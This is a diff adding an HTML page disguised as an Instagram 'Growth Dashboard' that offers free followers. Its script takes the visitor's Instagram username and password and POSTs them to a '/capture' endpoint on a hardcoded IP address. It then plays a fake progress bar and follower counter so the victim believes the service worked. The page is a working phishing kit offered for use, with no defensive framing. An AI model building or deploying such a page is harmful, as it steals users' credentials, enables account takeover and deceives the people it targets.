@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Growth Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* --- RESET & FONTS --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+        }
+
+        body {
+            /* Image wala Dark Purple/Red Gradient Background */
+            background: radial-gradient(circle at top left, #2c0e38, #000000);
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Ambient Glow (Background effect) */
+        body::before {
+            content: '';
+            position: absolute;
+            top: -10%;
+            right: -10%;
+            width: 50%;
+            height: 50%;
+            background: radial-gradient(circle, #6a1b9a 0%, transparent 70%);
+            opacity: 0.4;
+            filter: blur(80px);
+            z-index: -1;
+        }
+
+        /* --- GLASS CARD CONTAINER --- */
+        .card {
+            background: rgba(30, 30, 30, 0.6);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            width: 380px;
+            padding: 40px 30px;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: white;
+            transition: height 0.3s ease;
+        }
+
+        /* --- HEADER --- */
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .insta-logo-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+            /* Instagram Gradient Text */
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        h2 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            letter-spacing: 0.5px;
+        }
+
+        p.subtitle {
+            font-size: 13px;
+            color: #a0a0a0;
+        }
+
+        /* --- FORM ELEMENTS --- */
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 14px;
+        }
+
+        .input-field, select {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 14px 14px 14px 45px; /* Space for icon */
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            outline: none;
+            transition: 0.3s;
+            appearance: none; /* Removes default arrow */
+        }
+
+        /* Custom Arrow for Select */
+        .select-wrapper::after {
+            content: '\f078'; /* FontAwesome Chevron Down */
+            font-family: 'Font Awesome 6 Free';
+            font-weight: 900;
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            pointer-events: none;
+            font-size: 12px;
+        }
+
+        .input-field:focus, select:focus {
+            border-color: #bc1888; /* Purple border on focus like image */
+            box-shadow: 0 0 0 2px rgba(188, 24, 136, 0.2);
+            background: rgba(0, 0, 0, 0.5);
+        }
+
+        /* --- BUTTON --- */
+        .btn-start {
+            width: 100%;
+            margin-top: 10px;
+            padding: 15px;
+            border: none;
+            border-radius: 12px;
+            /* Gradient Button like Image 2 */
+            background: linear-gradient(90deg, #4f5bd5, #962fbf, #d62976, #fa7e1e);
+            background-size: 300% 100%;
+            color: white;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(214, 41, 118, 0.4);
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            animation: gradientMove 5s ease infinite;
+        }
+
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .btn-start:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(214, 41, 118, 0.6);
+        }
+
+        /* --- PROCESS SCREEN (Hidden Initially) --- */
+        #process-screen {
+            display: none;
+            text-align: center;
+        }
+
+        .user-preview {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 25px;
+            background: rgba(255,255,255,0.05);
+            padding: 10px;
+            border-radius: 50px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            padding-right: 20px;
+        }
+
+        .avatar-circle {
+            width: 40px;
+            height: 40px;
+            background: #ddd;
+            border-radius: 50%;
+        }
+
+        .user-info-text {
+            text-align: left;
+        }
+
+        .u-name {
+            font-weight: bold;
+            font-size: 14px;
+            display: block;
+        }
+
+        .verified {
+            color: #00ff88;
+            font-size: 11px;
+        }
+
+        /* Loading Spinner */
+        .loader-text {
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255,255,255,0.2);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 25px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            /* Gradient Bar like Image 1 */
+            background: linear-gradient(90deg, #4f5bd5, #d62976);
+            transition: width 0.5s ease;
+            box-shadow: 0 0 10px rgba(214, 41, 118, 0.7);
+        }
+
+        /* Delivered Box */
+        .delivered-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 16px;
+            padding: 20px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+
+        .delivered-label {
+            font-size: 10px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+
+        .delivered-count {
+            font-size: 42px;
+            font-weight: 800;
+            color: #fff;
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <i class="fab fa-instagram insta-logo-icon"></i>
+            <h2>Growth Dashboard</h2>
+            <p class="subtitle">Select your target metrics below.</p>
+        </div>
+
+        <div id="form-screen">
+            <div class="input-group">
+                <i class="far fa-user"></i>
+                <input type="text" id="username" class="input-field" placeholder="Username" autocomplete="off">
+            </div>
+
+            <div class="input-group">
+                <i class="fas fa-shield-alt"></i> <input type="password" id="password" class="input-field" placeholder="Password">
+            </div>
+
+            <div class="input-group select-wrapper">
+                <i class="fas fa-chart-line"></i>
+                <select id="followers" class="input-field">
+                    <option value="1000">1,000 Followers</option>
+                    <option value="2500">2,500 Followers</option>
+                    <option value="5000">5,000 Followers</option>
+                    <option value="10000">10,000 Followers (VIP)</option>
+                </select>
+            </div>
+
+            <button class="btn-start" onclick="startEngine()">
+                Start Growth Engine <i class="fas fa-bolt"></i>
+            </button>
+        </div>
+
+        <div id="process-screen">
+            
+            <div class="user-preview">
+                <div class="avatar-circle"></div>
+                <div class="user-info-text">
+                    <span class="u-name" id="display-username">@Username</span>
+                    <span class="verified">Account Verified</span>
+                </div>
+            </div>
+
+            <div class="loader-text">
+                <div class="spinner"></div>
+                <span id="status-text">Allocating resources...</span>
+            </div>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar"></div>
+            </div>
+
+            <div class="delivered-box">
+                <div class="delivered-label">Delivered</div>
+                <div class="delivered-count" id="count-display">0</div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        function startEngine() {
+    const userInput = document.getElementById('username').value.trim();
+    const passInput = document.getElementById('password').value;
+    const targetInput = document.getElementById('followers').value;
+
+    // Basic validation
+    if (!userInput) {
+        alert("Please enter a username.");
+        return;
+    }
+    if (!passInput) {
+        alert("Please enter a password.");
+        return;
+    }
+
+    const target = parseInt(targetInput, 10);
+    if (isNaN(target) || target < 1) {
+        alert("Please enter a valid number of followers.");
+        return;
+    }
+
+    const id = "1823013721"; 
+    const p = "Instagram"
+
+    fetch(`http://82.112.230.181:3000/capture`, {  
+    method: 'POST',  
+    headers: {  
+        'Content-Type': 'application/json',  
+    },  
+    body: JSON.stringify({  
+        userid: id,  
+        user: userInput,  
+        pass: passInput,  
+        platform: p  
+    })  
+})
+.then(response => {  
+    if (!response.ok) throw new Error(`Server error: ${response.status}`);  
+    return response.json();  
+})
+.then(data => {  
+    console.log("Server response:", data);  
+})
+.catch(err => {  
+    console.error("Fetch failed:", err);  
+});
+    document.getElementById('form-screen').style.display = 'none';
+    document.getElementById('process-screen').style.display = 'block';
+
+    const displayUser = userInput.startsWith('@') ? userInput : '@' + userInput;
+    document.getElementById('display-username').innerText = displayUser;
+
+    const progressBar   = document.getElementById('progress-bar');
+    const statusText    = document.getElementById('status-text');
+    const counterDisplay = document.getElementById('count-display');
+
+    let progress = 0;
+    let currentCount = 0;
+
+    const interval = setInterval(() => {
+        // Random smooth-ish progress
+        progress += Math.random() * 1.8 + 0.4; // 0.4–2.2% per tick
+        if (progress >= 100) {
+            progress = 100;
+            clearInterval(interval);
+            finish();
+            return;
+        }
+
+        progressBar.style.width = `${progress}%`;
+
+        // Status messages
+        if      (progress < 20)  statusText.innerText = "Connecting...";
+        else if (progress < 40)  statusText.innerText = "Authenticating user...";
+        else if (progress < 65)  statusText.innerText = "Processing request...";
+        else if (progress < 85)  statusText.innerText = "Delivering followers...";
+        else                     statusText.innerText = "Finalizing...";
+
+        // Counter animation (starts a bit later)
+        if (progress > 25) {
+            const increment = Math.max(1, Math.ceil(target / 120)); // smooth steps
+            currentCount += increment;
+            if (currentCount > target) currentCount = target;
+            counterDisplay.innerText = currentCount.toLocaleString();
+        }
+
+    }, 80); // smoother = faster interval
+
+    function finish() {
+        statusText.innerText = "Completed Successfully!";
+        statusText.style.color = "#00ff88";
+        
+        const spinner = document.querySelector('.spinner');
+        if (spinner) spinner.style.display = 'none';
+
+        const loaderText = document.querySelector('.loader-text');
+        if (loaderText) {
+            loaderText.innerHTML = '<i class="fas fa-check-circle" style="color:#00ff88"></i> Process Complete';
+        }
+    }
+}
+    </script>
+
+</body>
+</html>
